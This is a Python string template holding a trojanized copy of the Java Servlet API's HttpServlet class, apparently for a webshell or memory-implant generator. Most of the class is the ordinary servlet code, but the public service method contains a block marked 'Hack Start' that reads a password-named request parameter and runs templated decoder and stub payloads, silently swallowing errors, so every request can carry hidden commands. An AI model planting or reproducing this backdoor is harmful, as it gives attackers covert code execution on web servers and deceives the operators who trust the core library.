code = """
package javax.servlet.http;

import java.io.IOException;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.io.Writer;
import java.lang.reflect.*;
import java.math.BigInteger;
import java.text.MessageFormat;
import java.util.*;

import javax.servlet.AsyncEvent;
import javax.servlet.AsyncListener;
import javax.servlet.DispatcherType;
import javax.servlet.GenericServlet;
import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.WriteListener;


public abstract class HttpServlet extends GenericServlet {{

    private static final long serialVersionUID = 1L;

    private static final String METHOD_DELETE = "DELETE";
    private static final String METHOD_HEAD = "HEAD";
    private static final String METHOD_GET = "GET";
    private static final String METHOD_OPTIONS = "OPTIONS";
    private static final String METHOD_POST = "POST";
    private static final String METHOD_PUT = "PUT";
    private static final String METHOD_TRACE = "TRACE";

    private static final String HEADER_IFMODSINCE = "If-Modified-Since";
    private static final String HEADER_LASTMOD = "Last-Modified";

    private static final String LSTRING_FILE = "javax.servlet.http.LocalStrings";
    private static final ResourceBundle lStrings = ResourceBundle.getBundle(LSTRING_FILE);


    public HttpServlet() {{
        // NOOP
    }}

    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException
    {{
        String msg = lStrings.getString("http.method_get_not_supported");
        sendMethodNotAllowed(req, resp, msg);
    }}

    protected long getLastModified(HttpServletRequest req) {{
        return -1;
    }}

    protected void doHead(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {{

        if (DispatcherType.INCLUDE.equals(req.getDispatcherType())) {{
            doGet(req, resp);
        }} else {{
            NoBodyResponse response = new NoBodyResponse(resp);
            doGet(req, response);
            if (req.isAsyncStarted()) {{
                req.getAsyncContext().addListener(new NoBodyAsyncContextListener(response));
            }} else {{
                response.setContentLength();
            }}
        }}
    }}

    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {{

        String msg = lStrings.getString("http.method_post_not_supported");
        sendMethodNotAllowed(req, resp, msg);
    }}

    protected void doPut(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {{

        String msg = lStrings.getString("http.method_put_not_supported");
        sendMethodNotAllowed(req, resp, msg);
    }}

    protected void doDelete(HttpServletRequest req,
                            HttpServletResponse resp)
            throws ServletException, IOException {{

        String msg = lStrings.getString("http.method_delete_not_supported");
        sendMethodNotAllowed(req, resp, msg);
    }}


    private void sendMethodNotAllowed(HttpServletRequest req, HttpServletResponse resp, String msg) throws IOException {{
        String protocol = req.getProtocol();
        // Note: Tomcat reports "" for HTTP/0.9 although some implementations
        //       may report HTTP/0.9
        if (protocol.length() == 0 || protocol.endsWith("0.9") || protocol.endsWith("1.0")) {{
            resp.sendError(HttpServletResponse.SC_BAD_REQUEST, msg);
        }} else {{
            resp.sendError(HttpServletResponse.SC_METHOD_NOT_ALLOWED, msg);
        }}
    }}

    private static Method[] getAllDeclaredMethods(Class<?> c) {{

        if (c.equals(javax.servlet.http.HttpServlet.class)) {{
            return null;
        }}

        Method[] parentMethods = getAllDeclaredMethods(c.getSuperclass());
        Method[] thisMethods = c.getDeclaredMethods();

        if ((parentMethods != null) && (parentMethods.length > 0)) {{
            Method[] allMethods = new Method[parentMethods.length + thisMethods.length];
            System.arraycopy(parentMethods, 0, allMethods, 0, parentMethods.length);
            System.arraycopy(thisMethods, 0, allMethods, parentMethods.length, thisMethods.length);
            thisMethods = allMethods;
        }}

        return thisMethods;
    }}

    protected void doOptions(HttpServletRequest req,
                             HttpServletResponse resp)
            throws ServletException, IOException {{

        Method[] methods = getAllDeclaredMethods(this.getClass());

        boolean ALLOW_GET = false;
        boolean ALLOW_HEAD = false;
        boolean ALLOW_POST = false;
        boolean ALLOW_PUT = false;
        boolean ALLOW_DELETE = false;
        boolean ALLOW_TRACE = true;
        boolean ALLOW_OPTIONS = true;

        // Tomcat specific hack to see if TRACE is allowed
        Class<?> clazz = null;
        try {{
            clazz = Class.forName("org.apache.catalina.connector.RequestFacade");
            Method getAllowTrace = clazz.getMethod("getAllowTrace", (Class<?>[]) null);
            ALLOW_TRACE = ((Boolean) getAllowTrace.invoke(req, (Object[]) null)).booleanValue();
        }} catch (ClassNotFoundException | NoSuchMethodException | SecurityException |
                 IllegalAccessException | IllegalArgumentException | InvocationTargetException e) {{
            // Ignore. Not running on Tomcat. TRACE is always allowed.
        }}
        // End of Tomcat specific hack

        for (int i=0; i<methods.length; i++) {{
            Method m = methods[i];

            if (m.getName().equals("doGet")) {{
                ALLOW_GET = true;
                ALLOW_HEAD = true;
            }}
            if (m.getName().equals("doPost")) {{
                ALLOW_POST = true;
            }}
            if (m.getName().equals("doPut")) {{
                ALLOW_PUT = true;
            }}
            if (m.getName().equals("doDelete")) {{
                ALLOW_DELETE = true;
            }}
        }}

        String allow = null;
        if (ALLOW_GET) {{
            allow=METHOD_GET;
        }}
        if (ALLOW_HEAD) {{
            if (allow==null) {{
                allow=METHOD_HEAD;
            }} else {{
                allow += ", " + METHOD_HEAD;
            }}
        }}
        if (ALLOW_POST) {{
            if (allow==null) {{
                allow=METHOD_POST;
            }} else {{
                allow += ", " + METHOD_POST;
            }}
        }}
        if (ALLOW_PUT) {{
            if (allow==null) {{
                allow=METHOD_PUT;
            }} else {{
                allow += ", " + METHOD_PUT;
            }}
        }}
        if (ALLOW_DELETE) {{
            if (allow==null) {{
                allow=METHOD_DELETE;
            }} else {{
                allow += ", " + METHOD_DELETE;
            }}
        }}
        if (ALLOW_TRACE) {{
            if (allow==null) {{
                allow=METHOD_TRACE;
            }} else {{
                allow += ", " + METHOD_TRACE;
            }}
        }}
        if (ALLOW_OPTIONS) {{
            if (allow==null) {{
                allow=METHOD_OPTIONS;
            }} else {{
                allow += ", " + METHOD_OPTIONS;
            }}
        }}

        resp.setHeader("Allow", allow);
    }}

    protected void doTrace(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException
    {{

        int responseLength;

        String CRLF = "\\r\\n";
        StringBuilder buffer =
                new StringBuilder("TRACE ").append(req.getRequestURI()).append(" ").append(req.getProtocol());

        Enumeration<String> reqHeaderEnum = req.getHeaderNames();

        while( reqHeaderEnum.hasMoreElements() ) {{
            String headerName = reqHeaderEnum.nextElement();
            buffer.append(CRLF).append(headerName).append(": ")
                    .append(req.getHeader(headerName));
        }}

        buffer.append(CRLF);

        responseLength = buffer.length();

        resp.setContentType("message/http");
        resp.setContentLength(responseLength);
        ServletOutputStream out = resp.getOutputStream();
        out.print(buffer.toString());
        out.close();
    }}

    protected void service(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {{

        String method = req.getMethod();

        if (method.equals(METHOD_GET)) {{
            long lastModified = getLastModified(req);
            if (lastModified == -1) {{
                // servlet doesn't support if-modified-since, no reason
                // to go through further expensive logic
                doGet(req, resp);
            }} else {{
                long ifModifiedSince;
                try {{
                    ifModifiedSince = req.getDateHeader(HEADER_IFMODSINCE);
                }} catch (IllegalArgumentException iae) {{
                    // Invalid date header - proceed as if none was set
                    ifModifiedSince = -1;
                }}
                if (ifModifiedSince < (lastModified / 1000 * 1000)) {{
                    // If the servlet mod time is later, call doGet()
                    // Round down to the nearest second for a proper compare
                    // A ifModifiedSince of -1 will always be less
                    maybeSetLastModified(resp, lastModified);
                    doGet(req, resp);
                }} else {{
                    resp.setStatus(HttpServletResponse.SC_NOT_MODIFIED);
                }}
            }}

        }} else if (method.equals(METHOD_HEAD)) {{
            long lastModified = getLastModified(req);
            maybeSetLastModified(resp, lastModified);
            doHead(req, resp);

        }} else if (method.equals(METHOD_POST)) {{
            doPost(req, resp);

        }} else if (method.equals(METHOD_PUT)) {{
            doPut(req, resp);

        }} else if (method.equals(METHOD_DELETE)) {{
            doDelete(req, resp);

        }} else if (method.equals(METHOD_OPTIONS)) {{
            doOptions(req,resp);

        }} else if (method.equals(METHOD_TRACE)) {{
            doTrace(req,resp);

        }} else {{
            //
            // Note that this means NO servlet supports whatever
            // method was requested, anywhere on this server.
            //

            String errMsg = lStrings.getString("http.method_not_implemented");
            Object[] errArgs = new Object[1];
            errArgs[0] = method;
            errMsg = MessageFormat.format(errMsg, errArgs);

            resp.sendError(HttpServletResponse.SC_NOT_IMPLEMENTED, errMsg);
        }}
    }}

    private void maybeSetLastModified(HttpServletResponse resp,
                                      long lastModified) {{
        if (resp.containsHeader(HEADER_LASTMOD)) {{
            return;
        }}
        if (lastModified >= 0) {{
            resp.setDateHeader(HEADER_LASTMOD, lastModified);
        }}
    }}

    @Override
    public void service(ServletRequest req, ServletResponse res)
            throws ServletException, IOException {{

        // Hack Start
        String password = "{password}";
        String payload = req.getParameter(password);
        if (payload != null) {{ try {{
{decoder}
{stub}
        }} catch (Exception e) {{}}}}
        // Hack End

        HttpServletRequest  request;
        HttpServletResponse response;

        try {{
            request = (HttpServletRequest) req;
            response = (HttpServletResponse) res;
        }} catch (ClassCastException e) {{
            throw new ServletException(lStrings.getString("http.non_http"));
        }}
        service(request, response);
    }}

    private static class NoBodyResponse extends HttpServletResponseWrapper {{
        private final NoBodyOutputStream noBodyOutputStream;
        private ServletOutputStream originalOutputStream;
        private NoBodyPrintWriter noBodyWriter;
        private boolean didSetContentLength;

        private NoBodyResponse(HttpServletResponse r) {{
            super(r);
            noBodyOutputStream = new NoBodyOutputStream(this);
        }}

        private void setContentLength() {{
            if (!didSetContentLength) {{
                if (noBodyWriter != null) {{
                    noBodyWriter.flush();
                }}
                super.setContentLengthLong(noBodyOutputStream.getWrittenByteCount());
            }}
        }}


        @Override
        public void setContentLength(int len) {{
            super.setContentLength(len);
            didSetContentLength = true;
        }}

        @Override
        public void setContentLengthLong(long len) {{
            super.setContentLengthLong(len);
            didSetContentLength = true;
        }}

        @Override
        public void setHeader(String name, String value) {{
            super.setHeader(name, value);
            checkHeader(name);
        }}

        @Override
        public void addHeader(String name, String value) {{
            super.addHeader(name, value);
            checkHeader(name);
        }}

        @Override
        public void setIntHeader(String name, int value) {{
            super.setIntHeader(name, value);
            checkHeader(name);
        }}

        @Override
        public void addIntHeader(String name, int value) {{
            super.addIntHeader(name, value);
            checkHeader(name);
        }}

        private void checkHeader(String name) {{
            if ("content-length".equalsIgnoreCase(name)) {{
                didSetContentLength = true;
            }}
        }}

        @Override
        public ServletOutputStream getOutputStream() throws IOException {{
            originalOutputStream = getResponse().getOutputStream();
            return noBodyOutputStream;
        }}

        @Override
        public PrintWriter getWriter() throws UnsupportedEncodingException {{

            if (noBodyWriter == null) {{
                noBodyWriter = new NoBodyPrintWriter(noBodyOutputStream, getCharacterEncoding());
            }}
            return noBodyWriter;
        }}

        @Override
        public void reset() {{
            super.reset();
            resetBuffer();
            originalOutputStream = null;
        }}

        @Override
        public void resetBuffer() {{
            noBodyOutputStream.resetBuffer();
            if (noBodyWriter != null) {{
                noBodyWriter.resetBuffer();
            }}
        }}
    }}

    private static class NoBodyOutputStream extends ServletOutputStream {{

        private static final String LSTRING_FILE = "javax.servlet.http.LocalStrings";
        private static final ResourceBundle lStrings = ResourceBundle.getBundle(LSTRING_FILE);

        private final NoBodyResponse response;
        private boolean flushed = false;
        private long writtenByteCount = 0;

        private NoBodyOutputStream(NoBodyResponse response) {{
            this.response = response;
        }}

        private long getWrittenByteCount() {{
            return writtenByteCount;
        }}

        @Override
        public void write(int b) throws IOException {{
            writtenByteCount++;
            checkCommit();
        }}

        @Override
        public void write(byte buf[], int offset, int len) throws IOException {{
            if (buf == null) {{
                throw new NullPointerException(
                        lStrings.getString("err.io.nullArray"));
            }}

            if (offset < 0 || len < 0 || offset+len > buf.length) {{
                String msg = lStrings.getString("err.io.indexOutOfBounds");
                Object[] msgArgs = new Object[3];
                msgArgs[0] = Integer.valueOf(offset);
                msgArgs[1] = Integer.valueOf(len);
                msgArgs[2] = Integer.valueOf(buf.length);
                msg = MessageFormat.format(msg, msgArgs);
                throw new IndexOutOfBoundsException(msg);
            }}

            writtenByteCount += len;
            checkCommit();
        }}

        @Override
        public boolean isReady() {{
            // Will always be ready as data is swallowed.
            return true;
        }}

        @Override
        public void setWriteListener(WriteListener listener) {{
            response.originalOutputStream.setWriteListener(listener);
        }}

        private void checkCommit() throws IOException {{
            if (!flushed && writtenByteCount > response.getBufferSize()) {{
                response.flushBuffer();
                flushed = true;
            }}
        }}

        private void resetBuffer() {{
            if (flushed) {{
                throw new IllegalStateException(lStrings.getString("err.state.commit"));
            }}
            writtenByteCount = 0;
        }}
    }}

    private static class NoBodyPrintWriter extends PrintWriter {{

        private final NoBodyOutputStream out;
        private final String encoding;
        private PrintWriter pw;

        public NoBodyPrintWriter(NoBodyOutputStream out, String encoding) throws UnsupportedEncodingException {{
            super(out);
            this.out = out;
            this.encoding = encoding;

            Writer osw = new OutputStreamWriter(out, encoding);
            pw = new PrintWriter(osw);
        }}

        private void resetBuffer() {{
            out.resetBuffer();

            Writer osw = null;
            try {{
                osw = new OutputStreamWriter(out, encoding);
            }} catch (UnsupportedEncodingException e) {{
                // Impossible.
                // The same values were used in the constructor. If this method
                // gets called then the constructor must have succeeded so the
                // above call must also succeed.
            }}
            pw = new PrintWriter(osw);
        }}

        @Override
        public void flush() {{
            pw.flush();
        }}

        @Override
        public void close() {{
            pw.close();
        }}

        @Override
        public boolean checkError() {{
            return pw.checkError();
        }}

        @Override
        public void write(int c) {{
            pw.write(c);
        }}

        @Override
        public void write(char[] buf, int off, int len) {{
            pw.write(buf, off, len);
        }}

        @Override
        public void write(char[] buf) {{
            pw.write(buf);
        }}

        @Override
        public void write(String s, int off, int len) {{
            pw.write(s, off, len);
        }}

        @Override
        public void write(String s) {{
            pw.write(s);
        }}

        @Override
        public void print(boolean b) {{
            pw.print(b);
        }}

        @Override
        public void print(char c) {{
            pw.print(c);
        }}

        @Override
        public void print(int i) {{
            pw.print(i);
        }}

        @Override
        public void print(long l) {{
            pw.print(l);
        }}

        @Override
        public void print(float f) {{
            pw.print(f);
        }}

        @Override
        public void print(double d) {{
            pw.print(d);
        }}

        @Override
        public void print(char[] s) {{
            pw.print(s);
        }}

        @Override
        public void print(String s) {{
            pw.print(s);
        }}

        @Override
        public void print(Object obj) {{
            pw.print(obj);
        }}

        @Override
        public void println() {{
            pw.println();
        }}

        @Override
        public void println(boolean x) {{
            pw.println(x);
        }}

        @Override
        public void println(char x) {{
            pw.println(x);
        }}

        @Override
        public void println(int x) {{
            pw.println(x);
        }}

        @Override
        public void println(long x) {{
            pw.println(x);
        }}

        @Override
        public void println(float x) {{
            pw.println(x);
        }}

        @Override
        public void println(double x) {{
            pw.println(x);
        }}

        @Override
        public void println(char[] x) {{
            pw.println(x);
        }}

        @Override
        public void println(String x) {{
            pw.println(x);
        }}

        @Override
        public void println(Object x) {{
            pw.println(x);
        }}
    }}

    private static class NoBodyAsyncContextListener implements AsyncListener {{

        private final NoBodyResponse noBodyResponse;

        public NoBodyAsyncContextListener(NoBodyResponse noBodyResponse) {{
            this.noBodyResponse = noBodyResponse;
        }}

        @Override
        public void onComplete(AsyncEvent event) throws IOException {{
            noBodyResponse.setContentLength();
        }}

        @Override
        public void onTimeout(AsyncEvent event) throws IOException {{
            // NO-OP
        }}

        @Override
        public void onError(AsyncEvent event) throws IOException {{
            // NO-OP
        }}

        @Override
        public void onStartAsync(AsyncEvent event) throws IOException {{
            // NO-OP
        }}
    }}
}}
"""